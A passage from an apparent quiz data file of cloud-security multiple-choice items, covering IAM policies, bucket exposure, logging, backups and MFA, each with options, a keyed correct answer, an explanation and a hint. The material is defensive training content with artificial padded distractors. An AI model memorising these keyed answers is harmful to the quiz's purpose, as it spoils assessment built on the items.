    options: ["Leave it shared with everyone permanently in case other teams need it later","Make the snapshot public, and anyone can copy it","Email the snapshot to the tester as an attachment, and they can open it","Share it with that account only, and remove sharing later"],
    correct: 3, why: "Making it public is the runner-up since it is quick, but anyone can copy the data inside it.",
    hint: "Specific account only."
  },
  {
    id: 814, rank: 0, role: "cloud-security", topic: "SaaS Responsibility", difficulty: "BEGINNER",
    q: "A company uses a SaaS email service. Which task remains the customer's responsibility?",
    options: ["Patching the provider's data centre servers, in the first instance","Replacing failed disks in the provider's racks, and review the outcome at the next monthly meeting","Maintaining the provider's network routers","Managing user accounts, MFA and access settings"],
    correct: 3, why: "Even in SaaS, customers control identities, configuration and data sharing.",
    hint: "Accounts and settings."
  },
  {
    id: 815, rank: 0, role: "cloud-security", topic: "Private Subnet Purpose", difficulty: "BEGINNER",
    q: "What is a private subnet used for in a cloud network?",
    options: ["Storing public web pages for all visitors, until the next scheduled review takes place","Hosting resources that should not be directly reachable from the internet","Sending email to customers, and review the outcome at the next monthly meeting","Running the provider's billing system"],
    correct: 1, why: "Private subnets keep back-end systems away from direct internet access.",
    hint: "Not directly reachable."
  },
  {
    id: 816, rank: 0, role: "cloud-security", topic: "Cloud Backup Basics", difficulty: "BEGINNER",
    q: "Which practice best protects cloud data from accidental deletion or ransomware?",
    options: ["One copy in the same account with full delete rights for everyone, as a general rule","No backups, as the cloud provider is always reliable and never loses any data","Versioned backups, restricted delete rights and tested restores, in most cases","Backups that nobody has ever tried to restore as the first set was made"],
    correct: 2, why: "Protected and tested backups let you recover from deletion or malicious change.",
    hint: "Protect and test."
  },
  {
    id: 817, rank: 0, role: "cloud-security", topic: "Cloud Posture Tool", difficulty: "BEGINNER",
    q: "What does a cloud security posture management tool mainly do?",
    options: ["Checks cloud settings against best practice, and flags risks, in most cases","Pays the monthly invoice for the cloud account on behalf of the finance team","Replaces all of the staff who work in the security team of the organisation","Writes the application code for the developers who work on the cloud projects"],
    correct: 0, why: "CSPM finds misconfigurations such as open storage or weak rules.",
    hint: "Finds misconfigurations."
  },
  {
    id: 818, rank: 0, role: "cloud-security", topic: "Serverless Responsibility", difficulty: "BEGINNER",
    q: "In a serverless function service, which item is the customer still responsible for?",
    options: ["The cabling between the racks of servers that the provider operates","The firmware of the physical servers that run the functions in the data centre","The security of their function code and permissions","The cooling of the data centre in which the function platform is hosted"],
    correct: 2, why: "Providers run the infrastructure, but code and permissions remain with the customer.",
    hint: "Your code, your permissions."
  },
  {
    id: 819, rank: 0, role: "cloud-security", topic: "Role Instead of Keys", difficulty: "BEGINNER",
    q: "An application running in the cloud needs to access storage. What is the BEST way to give it access?",
    options: ["Attach a role to the workload so that it gets temporary credentials","Store a long-lived access key in the application's source code, in the first instance","Email an access key to the developer each month","Use the root account key in the application, then record the result in the ticket"],
    correct: 0, why: "Long-lived keys in code are the runner-up since they work, but they leak easily; roles provide short-lived credentials.",
    hint: "Use roles."
  },
  {
    id: 820, rank: 0, role: "cloud-security", topic: "Resource Tagging", difficulty: "BEGINNER",
    q: "Why are resource tags useful for security teams?",
    options: ["They make the resources run faster as the platform places them better","They block all network access to resources that have no tag at all","They encrypt the resources automatically when the tag value is set to secure","They show owners, environments and data sensitivity"],
    correct: 3, why: "Tags support ownership, inventory and policy decisions.",
    hint: "Know the owner."
  },
  {
    id: 821, rank: 0, role: "cloud-security", topic: "Default VPC Risk", difficulty: "BEGINNER",
    q: "Why should teams review resources in default networks and default settings of new accounts?",
    options: ["Defaults are always the safest option, and need no review by the security team","Defaults may be more open than the organisation's standards","Defaults are required by law, and may not be changed by any customer","Defaults cannot be changed after an account has been created by the company"],
    correct: 1, why: "Defaults are designed for ease of use, and may not meet security needs.",
    hint: "Defaults are generic."
  },
  {
    id: 822, rank: 0, role: "cloud-security", topic: "Alerts for Root Use", difficulty: "BEGINNER",
    q: "What should happen when the cloud account root user signs in?",
    options: ["All of the other users should be locked out until the sign-in is explained","The logs should be deleted to keep the account tidy after each root session","An alert should be raised so that the use can be checked","Nothing should happen, as root sign-ins are always routine and need no review"],
    correct: 2, why: "Root use should be rare, so each use needs explanation.",
    hint: "Alert on root."
  },
  {
    id: 823, rank: 0, role: "cloud-security", topic: "Data Classification in Cloud", difficulty: "BEGINNER",
    q: "Why should data be classified before it is moved to the cloud?",
    options: ["To make the data larger, and the provider can bill for more storage","To decide which controls and locations suit each type, in most cases","To avoid paying for storage by moving the data back to the old servers","To remove the need for encryption of the data that is stored in the cloud"],
    correct: 1, why: "Sensitive data may need stronger controls or must remain in certain regions.",
    hint: "Classify first."
  },
  {
    id: 824, rank: 0, role: "cloud-security", topic: "Shadow IT", difficulty: "BEGINNER",
    q: "What is shadow IT in the context of cloud services?",
    options: ["A cloud service that only works at night when the staff are not in the office","Staff using cloud services without IT or security approval","A cloud account that has been created by the company but has no users","A backup copy of the whole cloud account that is stored by the provider"],
    correct: 1, why: "Unapproved services can hold company data outside normal controls.",
    hint: "Unapproved services."
  },
  {
    id: 825, rank: 0, role: "cloud-security", topic: "Object Versioning", difficulty: "BEGINNER",
    q: "What is a benefit of enabling versioning on a cloud storage bucket?",
    options: ["Earlier versions can be restored after a mistaken or malicious change","The bucket becomes public, and other teams can see the earlier versions","Files become smaller as only the changed parts are kept in the bucket","Storage becomes free as the provider does not bill for old versions"],
    correct: 0, why: "Versioning keeps earlier copies of objects.",
    hint: "Restore earlier versions."
  },
  {
    id: 826, rank: 0, role: "cloud-security", topic: "CDN and WAF Purpose", difficulty: "BEGINNER",
    q: "What can a web application firewall in front of a cloud website do?",
    options: ["Block common web attacks such as injection attempts","Encrypt the database, then record the result in the ticket","Write the code, and revisit the decision after the next release","Reduce the number of users"],
    correct: 0, why: "A WAF filters malicious requests before they reach the application.",
    hint: "Filter requests."
  },
  {
    id: 827, rank: 0, role: "cloud-security", topic: "Cloud Key Management", difficulty: "BEGINNER",
    q: "Why use a managed key service for encryption keys instead of storing keys in files?",
    options: ["Keys become shorter, and the encryption of the data runs more quickly","Keys are visible to everyone in the account, and the teams can share them","Keys are protected, access is controlled and use is logged","Keys never expire, and no rotation is ever needed by the owners"],
    correct: 2, why: "Central key management supports control and audit.",
    hint: "Managed keys."
  },
  {
    id: 828, rank: 0, role: "cloud-security", topic: "Shared Account Risk", difficulty: "BEGINNER",
    q: "Why is sharing one cloud administrator login among several people a problem?",
    options: ["Actions cannot be linked to an individual and access cannot be removed for one person","It lowers the cost","It improves accountability","It makes the console slower"],
    correct: 0, why: "Individual accounts give accountability and allow proper offboarding.",
    hint: "No shared logins."
  },
  {
    id: 829, rank: 0, role: "cloud-security", topic: "Container Image Source", difficulty: "BEGINNER",
    q: "Which source is the safest for container images used in production?",
    options: ["An image sent by email","A trusted private registry with scanned and approved images","A random link in a chat message","Any public image found online"],
    correct: 1, why: "Trusted and scanned images reduce the risk of malicious or vulnerable content.",
    hint: "Approved registry."
  },
  {
    id: 830, rank: 0, role: "cloud-security", topic: "Single Sign-On for Cloud", difficulty: "BEGINNER",
    q: "What is a benefit of using single sign-on for cloud applications?",
    options: ["MFA cannot be used","Each application has its own separate password","Passwords are shared by everyone","Central control of access and quick removal when someone leaves"],
    correct: 3, why: "SSO centralises authentication and offboarding.",
    hint: "Central control."
  },
  {
    id: 831, rank: 0, role: "cloud-security", topic: "Disaster Recovery in Cloud", difficulty: "BEGINNER",
    q: "What does deploying across more than one availability zone mainly improve?",
    options: ["Encryption strength","Resilience if one data centre location fails","Password strength","Email delivery"],
    correct: 1, why: "Multiple zones reduce single points of failure.",
    hint: "Resilience."
  },
  {
    id: 832, rank: 0, role: "cloud-security", topic: "Cloud Account Separation", difficulty: "BEGINNER",
    q: "Why do many organisations use separate cloud accounts for production and testing?",
    options: ["To limit the impact of mistakes or compromise in testing on production","To avoid using encryption","To make billing impossible","To reduce the number of users"],
    correct: 0, why: "Separation provides stronger boundaries.",
    hint: "Separate accounts."
  },
  {
    id: 833, rank: 0, role: "cloud-security", topic: "Billing Alerts", difficulty: "BEGINNER",
    q: "How can billing alerts help security?",
    options: ["They replace logging","They stop all attacks","They can reveal unexpected resource use caused by compromise","They encrypt data"],
    correct: 2, why: "Unusual cost can be an early sign of abuse.",
    hint: "Cost spikes."
  },
  {
    id: 834, rank: 0, role: "cloud-security", topic: "Misconfigured Database Exposure", difficulty: "BEGINNER",
    q: "A cloud database is found reachable from the internet with a weak password. What is the BEST response?",
    options: ["Add a banner about legal use, until the next scheduled review takes place","Wait to see if anything happens","Restrict network access, rotate credentials and review access logs","Change the database name only"],
    correct: 2, why: "Changing the name is the runner-up as it looks like a change, but it does not remove the exposure.",
    hint: "Close the exposure."
  },
  {
    id: 835, rank: 0, role: "cloud-security", topic: "API Gateway Role", difficulty: "BEGINNER",
    q: "What is one security benefit of an API gateway in front of back-end services?",
    options: ["It writes code","It hides all security risks","It stores backups","Central authentication, throttling and logging of requests"],
    correct: 3, why: "A gateway enforces common controls.",
    hint: "Central control."
  },
  {
    id: 836, rank: 0, role: "cloud-security", topic: "Vulnerability Scanning in Cloud", difficulty: "BEGINNER",
    q: "Why scan virtual machine images for vulnerabilities before they are used?",
    options: ["To change the region","To avoid encryption","To make the image larger","To find known weaknesses and fix them before deployment"],
    correct: 3, why: "Early scanning reduces risk in production.",
    hint: "Scan before use."
  },
  {
    id: 837, rank: 0, role: "cloud-security", topic: "Cloud Incident Reporting", difficulty: "BEGINNER",
    q: "A staff member notices an unexpected public link to a company file. What should they do?",
    options: ["Ignore it, then record the result in the ticket","Report it to the security team promptly","Share it with a friend","Delete the file, and say nothing"],
    correct: 1, why: "Prompt reporting enables response.",
    hint: "Report it."
  },
  {
    id: 838, rank: 0, role: "cloud-security", topic: "Lifecycle Rules", difficulty: "BEGINNER",
    q: "What is a purpose of lifecycle rules on stored data?",
    options: ["Make data public","Disable logging","Automatically move or delete data according to retention requirements","Stop encryption"],
    correct: 2, why: "Rules help meet retention and minimisation requirements.",
    hint: "Retention."
  },
  {
    id: 839, rank: 0, role: "cloud-security", topic: "Customer-Managed Keys", difficulty: "BEGINNER",
    q: "Why might an organisation choose customer-managed encryption keys?",
    options: ["To remove audit logs","To make data public","To avoid using encryption","To keep control over key access and the ability to revoke them"],
    correct: 3, why: "Control over keys supports compliance and risk requirements.",
    hint: "Control the keys."
  },
  {
    id: 840, rank: 0, role: "cloud-security", topic: "Exposed Management Port", difficulty: "BEGINNER",
    exhibit: "Port scan 203.0.113.80\n3306/tcp open mysql\n22/tcp filtered ssh\n443/tcp open https",
    q: "A scan shows a cloud database management port open to the whole internet. Which action is best?",
    options: ["Hide the server name in the console, in the first instance","Leave it open, and add a longer password only, and review the outcome at the next monthly meeting","Restrict it to trusted addresses or a private connection","Change the port number, and keep it open"],
    correct: 2, why: "Management ports should not be reachable from anywhere, and obscurity does not remove the exposure.",
    hint: "Close it."
  },
  {
    id: 841, rank: 1, role: "cloud-security", topic: "Reading an IAM Policy", difficulty: "INTERMEDIATE",
    exhibit: "{\"Effect\":\"Allow\",\"Action\":\"s3:*\",\"Resource\":\"*\"}",
    q: "What does this IAM policy statement permit?",
    options: ["Read-only access to one bucket that holds the reports of the finance team","Any action on any storage bucket","Deleting only the log files that are older than ninety days in one bucket","Nothing at all, as the statement has no conditions attached to it"],
    correct: 1, why: "A wildcard action and resource for the storage service gives full control over every bucket.",
    hint: "Read action and resource."
  },
  {
    id: 842, rank: 1, role: "cloud-security", topic: "Bucket Policy Review", difficulty: "INTERMEDIATE",
    exhibit: "{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::reports-prod/*\"}",
    q: "Which change to this bucket policy is the BEST way to restrict access to the company's own accounts?",
    options: ["Keep the wildcard principal, and add a comment","Replace the wildcard principal with the company's own accounts","Turn on versioning only and leave the principal as it is in the policy","Add a longer bucket name, and outsiders find it much harder to guess it"],
    correct: 1, why: "Versioning is the runner-up as it helps recovery, but it does not restrict who may read the objects.",
    hint: "Fix the principal."
  },
  {
    id: 843, rank: 1, role: "cloud-security", topic: "Instance Metadata Hardening", difficulty: "INTERMEDIATE",
    q: "Which setting best reduces the risk of credential theft through server-side request forgery on a virtual machine?",
    options: ["Require session-based metadata access (IMDSv2) and limit hop count","Open the metadata port to the internet, until the next scheduled review takes place","Disable the instance role","Allow metadata access without tokens"],
    correct: 0, why: "Token-based metadata requests are much harder to abuse through a forged request.",
    hint: "Metadata v2."
  },
  {
    id: 844, rank: 1, role: "cloud-security", topic: "Flow Log Analysis", difficulty: "INTERMEDIATE",
    exhibit: "2 123456789012 eni-0a1b 198.51.100.23 10.0.1.15 51822 22 6 4 240 1709366400 1709366460 REJECT OK",
    q: "What does this VPC flow log line suggest?",
    options: ["A rejected inbound attempt to reach SSH","A completed file download from a storage service to an internal workstation","An outbound DNS request from a server to the resolver of the VPC network","A successful database query from an application server to its own replica"],
    correct: 0, why: "REJECT on port 22 shows a blocked attempt to reach SSH.",
    hint: "Check the action field."
  },
  {
    id: 845, rank: 1, role: "cloud-security", topic: "Service Control Policy Use", difficulty: "INTERMEDIATE",
    q: "What is the purpose of a service control policy in an organisation with many accounts?",
    options: ["Paying invoices","Setting maximum permissions that accounts cannot exceed","Creating users in each account","Encrypting the storage, then record the result in the ticket"],
    correct: 1, why: "SCPs act as guardrails that limit what any identity in the account may do.",
    hint: "Guardrails for accounts."
  },
  {
    id: 846, rank: 1, role: "cloud-security", topic: "Cross-Account Role Trust", difficulty: "INTERMEDIATE",
    exhibit: "{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"*\"},\"Action\":\"sts:AssumeRole\"}",
    q: "Which trust policy is the most dangerous for a role in your account?",
    options: ["A principal of * that anyone can assume","A named partner account that must present an external ID when assuming it","A specific user inside your own account who has MFA turned on at sign in","A specific cloud service that is allowed to assume the role for its own tasks"],
    correct: 0, why: "A wildcard principal lets any account assume the role.",
    hint: "Who can assume it."
  },
  {
    id: 847, rank: 1, role: "cloud-security", topic: "CloudTrail Event Review", difficulty: "INTERMEDIATE",
    exhibit: "eventName: StopLogging\nuserIdentity: arn:aws:iam::1234:user/temp-dev\nsourceIPAddress: 203.0.113.55\neventTime: 2026-03-02T02:11:09Z",
    q: "Which CloudTrail event is the most concerning from a security view?",
    options: ["StopLogging by an unexpected user","DescribeInstances by a monitoring role, as a general rule","ListUsers by an auditor","GetObject on a public website bucket"],
    correct: 0, why: "Disabling audit logging is a common attacker action to hide activity.",
    hint: "Who turned off the logs."
  },
  {
    id: 848, rank: 1, role: "cloud-security", topic: "Key Policy Scope", difficulty: "INTERMEDIATE",
    q: "A KMS key policy grants decrypt to all users in the account. What is the improvement?",
    options: ["Make the key public, and every application can use it without a request","Allow decrypt for every principal outside the account, and partners can read data","Limit decrypt to the specific roles that need it, and revisit the decision after the next release","Remove all of the logging on the key, and the audit trail stays small, until the next scheduled review takes place"],
    correct: 2, why: "Least privilege on keys limits who can read protected data.",
    hint: "Scope the key."
  },
  {
    id: 849, rank: 1, role: "cloud-security", topic: "Private Endpoints", difficulty: "INTERMEDIATE",
    q: "What is the benefit of using private endpoints for access to a cloud storage service from a VPC?",
    options: ["Storage becomes free as private traffic is not billed by the provider","The bucket becomes public, and every virtual network can reach it directly","Traffic stays on the provider's private network","Encryption is no longer needed as private traffic cannot be intercepted"],
    correct: 2, why: "Private connectivity reduces exposure and supports tighter network controls.",
    hint: "Stay off the internet."
  },
  {
    id: 850, rank: 1, role: "cloud-security", topic: "Security Group Versus NACL", difficulty: "INTERMEDIATE",
    q: "How does a security group differ from a network ACL?",
    options: ["Security groups apply to whole subnets and are stateless, unlike the NACL","Security groups are stateful and attach to resources, NACLs are stateless","Network ACLs encrypt the traffic that passes through them, unlike security groups","They are identical in the way that they work and in where they are applied"],
    correct: 1, why: "Security groups track connections; NACLs evaluate each packet in both directions.",
    hint: "Stateful versus stateless."
  },
  {
    id: 851, rank: 1, role: "cloud-security", topic: "Secrets Manager Rotation", difficulty: "INTERMEDIATE",
    q: "A database password is stored in an application config file. What is the BEST improvement?",
    options: ["Encrypt the config file with a password in the same folder","Email the password to the whole team, and everyone has a copy to hand","Change the password once a year, and write the new value in the team's runbook","Use a secrets service with rotation and role-based retrieval"],
    correct: 3, why: "Encrypting beside the file is the runner-up as it looks protective, but the key is stored next to the secret.",
    hint: "Rotate and retrieve."
  },
  {
    id: 852, rank: 1, role: "cloud-security", topic: "Kubernetes Network Policy", difficulty: "INTERMEDIATE",
    exhibit: "apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny\nspec:\n  podSelector: {}\n  policyTypes: [Ingress, Egress]",
    q: "What does a default-deny network policy in a Kubernetes namespace achieve?",
    options: ["Pods cannot start as the scheduler needs permission to place them","All pods can talk to every other pod in the cluster as before the change","Logs are disabled for every pod in the namespace to reduce the noise","Pods can talk only to allowed destinations"],
    correct: 3, why: "Without policies, pods can generally reach each other freely.",
    hint: "Deny by default."
  },
  {
    id: 853, rank: 1, role: "cloud-security", topic: "Lambda Permission Review", difficulty: "INTERMEDIATE",
    q: "A serverless function that only reads one table has an administrator role. What is the finding?",
    options: ["A logging feature that records every call that the function makes to the tables","An encryption setting that protects the data when it is read from the table","Excessive permissions that raise the impact of compromise","A performance improvement as administrator roles make the function start faster"],
    correct: 2, why: "The role should be limited to the actions and resources the function needs.",
    hint: "Over-permissioned."
  },
  {
    id: 854, rank: 1, role: "cloud-security", topic: "Container Image Scanning", difficulty: "INTERMEDIATE",
    q: "At which point should container images be scanned for vulnerabilities?",
    options: ["In the pipeline and continuously in the registry","Only after an incident, to confirm which image was running on the affected node","Only once a year, when the auditors ask for a list of all of the images","Never, as images are immutable"],
    correct: 0, why: "New vulnerabilities appear over time, so scanning should be repeated.",
    hint: "Build and registry."
  },
  {
    id: 855, rank: 1, role: "cloud-security", topic: "CIS Benchmark Use", difficulty: "INTERMEDIATE",
    q: "How should a team use a CIS benchmark for its cloud accounts?",
    options: ["Apply every recommendation blindly to all accounts without testing the effect on services","Ignore it, as benchmarks are written for a different type of organisation","Use it only for the office printers, and the other devices on the staff network","Measure against it, fix gaps by risk and track exceptions, as a general rule"],
    correct: 3, why: "Benchmarks guide hardening but need judgement and exception handling.",
    hint: "Measure and decide."
  },
  {
    id: 856, rank: 1, role: "cloud-security", topic: "Anomalous API Calls", difficulty: "INTERMEDIATE",
    q: "A role that normally lists resources suddenly calls many data export APIs at night. What is the BEST first step?",
    options: ["Treat it as possible compromise, and restrict the role session, as a first step","Increase the permissions of the role, and the export calls stop failing, in most cases","Wait to see whether it continues","Delete the logs of the role, and the alerts about it are no longer raised"],
    correct: 0, why: "Waiting is the runner-up as it avoids disruption, but unusual data export calls can indicate active theft.",
    hint: "Contain and review."
  },
  {
    id: 857, rank: 1, role: "cloud-security", topic: "Backup Vault Lock", difficulty: "INTERMEDIATE",
    q: "What does enabling a backup vault lock help protect against?",
    options: ["Unused regions","Large costs from storing too many copies of the same data in several regions","Deletion of backups by compromised accounts","Slow restores when the data set grows beyond the size of the largest disk"],
    correct: 2, why: "Immutability stops attackers destroying recovery points.",
    hint: "Immutable backups."
  },
  {
    id: 858, rank: 1, role: "cloud-security", topic: "Tag-Based Access", difficulty: "INTERMEDIATE",
    q: "What is the main risk of using only user-editable tags to grant access to resources?",
    options: ["Tags cannot be searched by the security team when they review an incident","Tags are too long to be displayed in the console in a readable manner","Tags use storage","Users who can edit tags may give themselves access"],
    correct: 3, why: "Access control based on tags must also control who can modify the tags.",
    hint: "Who edits the tags."
  },
  {
    id: 859, rank: 1, role: "cloud-security", topic: "Transit Network Design", difficulty: "INTERMEDIATE",
    q: "A company connects 30 cloud networks. Which design best supports central inspection and control?",
    options: ["A full mesh of direct peering links between all networks with no inspection","A hub-and-spoke design with central inspection","Public addresses on every server and the teams can reach them easily","One flat network that holds every workload of every team in the company"],
    correct: 1, why: "Hub-and-spoke centralises routing policy and monitoring.",
    hint: "Hub and spoke."
  },
  {
    id: 860, rank: 1, role: "cloud-security", topic: "Console Access Review", difficulty: "INTERMEDIATE",
    exhibit: "User         Policy              MFA   LastSignIn\nalice        ReadOnly            yes   2026-03-01\nsvc-batch    AdministratorAccess no    never\nbob          PowerUser           yes   2026-02-27\nold-contractor AdministratorAccess no  2025-04-02",
    q: "Which access review finding is the highest priority?",
    options: ["Admin users with no MFA and no recent sign-in, as a general rule","Read-only users who have MFA enabled and who sign in every week","Service roles with narrow permissions that were reviewed by the owner last month","Disabled accounts that cannot sign in and have no keys attached to them"],
    correct: 0, why: "Dormant, powerful accounts without MFA are easy targets.",
    hint: "Powerful and unprotected."
  },
  {
    id: 861, rank: 1, role: "cloud-security", topic: "Logging Destination", difficulty: "INTERMEDIATE",
    q: "Where should cloud audit logs be delivered to resist tampering by a compromised workload account?",
    options: ["A local disk on a server that is managed by the team that creates the logs","Nowhere, as the provider keeps a copy of everything for the customer","The same account in a public bucket and auditors can read the files","A separate logging account with write-only access, as a general rule"],
    correct: 3, why: "Separate accounts protect evidence from the compromised environment.",
    hint: "Separate logging account."
  },
  {
    id: 862, rank: 1, role: "cloud-security", topic: "Data Exfiltration Controls", difficulty: "INTERMEDIATE",
    q: "Which control best limits copying of sensitive data to unauthorised external accounts?",
    options: ["More dashboards that show the volume of data that leaves the account each day, as a general rule","A longer password policy for the users who have access to the sensitive data","Resource and endpoint policies limiting data access to the organisation, in most cases","Daily reminders to staff not to copy company data to their personal accounts"],
    correct: 2, why: "Perimeter controls on data access reduce exfiltration paths.",
    hint: "Constrain data paths."
  },
  {
    id: 863, rank: 1, role: "cloud-security", topic: "Cloud Workload Protection", difficulty: "INTERMEDIATE",
    q: "What does runtime protection add to a cloud workload beyond image scanning?",
    options: ["Smaller images as the agent removes unused layers when the workload starts","Faster builds as the agent caches the dependencies for the pipeline jobs","Detection of suspicious behaviour while it is running","A new region in which the workload can run when the first one is busy"],
    correct: 2, why: "Scanning finds known flaws; runtime protection sees active misuse.",
    hint: "Runtime behaviour."
  },
  {
    id: 864, rank: 1, role: "cloud-security", topic: "Resource Policy Conditions", difficulty: "INTERMEDIATE",
    exhibit: "{\"Effect\":\"Deny\",\"Principal\":\"*\",\"Action\":\"s3:*\",\"Resource\":\"arn:aws:s3:::reports-prod/*\",\"Condition\":{\"Bool\":{\"aws:SecureTransport\":\"false\"}}}",
    q: "Which condition best ensures a bucket is only accessed over encrypted connections?",
    options: ["A policy denying requests where secure transport is false","Using tags, and review the outcome at the next monthly meeting","Disabling versioning","A longer bucket name"],
    correct: 0, why: "Policies can deny unencrypted access.",
    hint: "Deny insecure transport."
  },
  {
    id: 865, rank: 1, role: "cloud-security", topic: "Console MFA Types", difficulty: "INTERMEDIATE",
    q: "Which MFA method is the most resistant to phishing for cloud administrators?",
    options: ["Hardware security keys","Security questions","SMS codes","Email codes, in most cases"],
    correct: 0, why: "Hardware keys check the website origin and resist relay attacks.",
    hint: "Hardware keys."
  },
  {
    id: 866, rank: 1, role: "cloud-security", topic: "Account Vending Security", difficulty: "INTERMEDIATE",
    q: "New cloud accounts are created by hand with different settings. What is the best improvement?",
    options: ["Allowing any settings in the new accounts and teams can move quickly","A checklist emailed to the teams who create new accounts by hand each time","An automated account factory with baseline guardrails, as a general rule","More meetings between the security team, and the account owners each month"],
    correct: 2, why: "Automation ensures every account starts secure.",
    hint: "Baseline automation."
  },
  {
    id: 867, rank: 1, role: "cloud-security", topic: "WAF Rule Modes", difficulty: "INTERMEDIATE",
    q: "Why deploy a new WAF rule in count or monitor mode first?",
    options: ["To avoid logging","To see false positives before blocking real users","To hide the rule","To make the rule faster"],
    correct: 1, why: "Testing prevents outages from overblocking.",
    hint: "Observe first."
  },
  {
    id: 868, rank: 1, role: "cloud-security", topic: "Public IP Inventory", difficulty: "INTERMEDIATE",
    q: "Why is it important to inventory resources with public IP addresses?",
    options: ["They cost nothing","They are always secure","They cannot be changed","They are directly reachable and form the external attack surface"],
    correct: 3, why: "Knowing exposure helps prioritise controls.",
    hint: "External surface."
  },
  {
    id: 869, rank: 1, role: "cloud-security", topic: "Database Encryption Features", difficulty: "INTERMEDIATE",
    q: "Which feature protects a managed database against theft of storage snapshots?",
    options: ["A banner on the login page that warns users about unauthorised access, as a general rule","A longer table name that makes the sensitive tables harder to guess","Public access to the database, and the snapshots can be copied freely","Encryption at rest with a managed key"],
    correct: 3, why: "Encrypted snapshots cannot be read without key access.",
    hint: "Encrypt snapshots."
  },
  {
    id: 870, rank: 1, role: "cloud-security", topic: "Workload Identity Federation", difficulty: "INTERMEDIATE",
    q: "A CI pipeline deploys to the cloud using stored long-lived keys. What is the BEST improvement?",
    options: ["Share the keys more widely, and revisit the decision after the next release","Use workload identity federation to obtain short-lived credentials per run","Move the keys to a wiki","Rotate the stored keys yearly"],
    correct: 1, why: "Yearly rotation is the runner-up because it improves hygiene, but long-lived keys still leak and last too long.",
    hint: "Federate the pipeline."
  },
  {
    id: 871, rank: 1, role: "cloud-security", topic: "Cost and Security Alerts", difficulty: "INTERMEDIATE",
    q: "Which alert combination best helps detect cryptomining abuse of an account?",
    options: ["Printer alerts","Unusual compute launches in unused regions and cost anomaly alerts","Email delivery alerts","Cooling alerts"],
    correct: 1, why: "Abuse usually creates sudden compute usage.",
    hint: "Compute anomalies."
  },
  {
    id: 872, rank: 1, role: "cloud-security", topic: "Storage Access Logging", difficulty: "INTERMEDIATE",
    q: "Why enable object-level access logging for sensitive storage?",
    options: ["To increase object size","To reduce cost","To see who read or copied specific objects during an investigation","To disable encryption"],
    correct: 2, why: "Data events show access to individual objects.",
    hint: "Object-level visibility."
  },
  {
    id: 873, rank: 1, role: "cloud-security", topic: "Cloud Network Segmentation", difficulty: "INTERMEDIATE",
    q: "Which design best separates production databases from internet-facing web servers?",
    options: ["Open security groups","Different subnets with security groups allowing only the application tier to reach the database","One subnet for everything, as a general rule","Public database addresses"],
    correct: 1, why: "Layered network controls limit paths to data.",
    hint: "Tiered subnets."
  },
  {
    id: 874, rank: 1, role: "cloud-security", topic: "API Authentication Choice", difficulty: "INTERMEDIATE",
    q: "Which authentication approach is best for a public API serving mobile apps?",
    options: ["A secret in the URL","No authentication","A shared static key in the app","Short-lived tokens issued by an identity provider with scoped permissions"],
    correct: 3, why: "Static keys in apps can be extracted and reused.",
    hint: "Short-lived tokens."
  },
  {
    id: 875, rank: 1, role: "cloud-security", topic: "Cloud Vendor Concentration", difficulty: "INTERMEDIATE",
    q: "Why might a company design critical services to run in more than one region?",
    options: ["To avoid logging, as the logs from two regions are hard to combine","To reduce the amount of testing that the team needs to carry out","To lower the strength of the encryption that is used between the regions","To remain available if a region fails"],
    correct: 3, why: "Regional redundancy improves resilience.",
    hint: "Regional resilience."
  },
  {
    id: 876, rank: 1, role: "cloud-security", topic: "Open Redirect in Cloud Console", difficulty: "INTERMEDIATE",
    q: "Which user behaviour best reduces risk of cloud console phishing?",
    options: ["Sharing passwords","Disabling MFA","Clicking links in messages, and review the outcome at the next monthly meeting","Using bookmarks or SSO portals rather than links in email"],
    correct: 3, why: "Trusted entry points reduce the chance of fake login pages.",
    hint: "Use bookmarks."
  },
  {
    id: 877, rank: 1, role: "cloud-security", topic: "Termination of Cloud Resources", difficulty: "INTERMEDIATE",
    q: "Why should unused cloud resources be deleted promptly?",
    options: ["They protect data","They can be forgotten, misconfigured and exploited","They improve security","They are free"],
    correct: 1, why: "Orphaned resources add risk and cost.",
    hint: "Remove the unused."
  },
  {
    id: 878, rank: 1, role: "cloud-security", topic: "GuardDuty-Style Finding", difficulty: "INTERMEDIATE",
    exhibit: "Finding: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration\nResource: i-0abc123 (role web-app-role)\nUsed from: 198.51.100.77 (not in VPC)\nSeverity: High",
    q: "A cloud threat detection service reports credentials from an instance role used from an external IP address. What is the best response?",
    options: ["Rename the instance","Ignore it as the role is trusted","Revoke the role sessions, isolate the instance and investigate how the credentials left","Add a tag to the instance, and review the outcome at the next monthly meeting"],
    correct: 2, why: "Credentials used outside the workload indicate theft, so revoke and investigate.",
    hint: "Credentials used elsewhere."
  },
  {
    id: 879, rank: 1, role: "cloud-security", topic: "Block Public Access Setting", difficulty: "INTERMEDIATE",
    q: "Which account-level control best prevents accidental public exposure of storage buckets?",
    options: ["Block public access enforced at the account or organisation level","A larger bucket size","A reminder to developers","A naming standard"],
    correct: 0, why: "Preventive account-level settings override mistakes in individual policies.",
    hint: "Prevent, do not remind."
  },
  {
    id: 880, rank: 1, role: "cloud-security", topic: "Zone Redundancy Versus Backup", difficulty: "INTERMEDIATE",
    q: "A team believes multi-zone deployment replaces backups. What is the correct view?",
    options: ["It does replace backups","Backups are only for old systems","Redundancy handles infrastructure failure but not deletion, corruption or ransomware, which need backups","Both are identical"],
    correct: 2, why: "Replication copies mistakes and malicious changes as well as good data.",
    hint: "Replication is not backup."
  },
  {
    id: 881, rank: 2, role: "cloud-security", topic: "PassRole Risk", difficulty: "ADVANCED",
    exhibit: "{\"Effect\":\"Allow\",\"Action\":[\"iam:PassRole\",\"ec2:RunInstances\"],\"Resource\":\"*\"}",
    q: "Why is this permission a privilege escalation risk?",
    options: ["It blocks all role use","It lets the user hand powerful roles to services they launch","It only affects the billing reports that finance teams review each month","It lets the user read only the logs of services that run in one account"],
    correct: 1, why: "Passing a more privileged role to a compute service lets the user act with those permissions.",
    hint: "Which roles can be passed."
  },
  {
    id: 882, rank: 2, role: "cloud-security", topic: "Access Key Age Finding", difficulty: "ADVANCED",
    exhibit: "User      Key1 Age  Last Used   MFA\nci-deploy 812 days  2 days ago  no\nold-batch 1190 days never       no\nalice     41 days   today       yes",
    q: "What is the most important remediation for this access key report?",
